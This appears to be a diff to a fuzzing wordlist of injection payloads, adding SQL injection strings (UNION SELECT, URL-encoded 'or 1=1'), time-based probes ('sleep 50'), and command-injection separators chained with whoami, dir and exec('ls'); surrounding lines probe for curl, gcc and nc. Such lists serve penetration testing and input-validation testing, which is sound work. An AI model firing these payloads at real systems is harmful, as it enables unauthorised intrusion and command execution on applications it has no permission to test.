@@ -40,6 +40,16 @@ admin'--
 ' or 1=1 or ''='
 ' or ''='
 x' or 1=1 or 'x'='y
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
 which curl
 which gcc
 which nc
@@ -64,3 +74,30 @@ whoami
 $(`whoami`)
 & whoami
 && whoami
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+| dir
+; dir
+$(`dir`)
+& dir
+&& dir
+'| dir
+'; dir
+'$(`dir`)
+'& dir
+'&& dir
+"| dir
+"; dir
+"$(`dir`)
+"& dir
+"&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
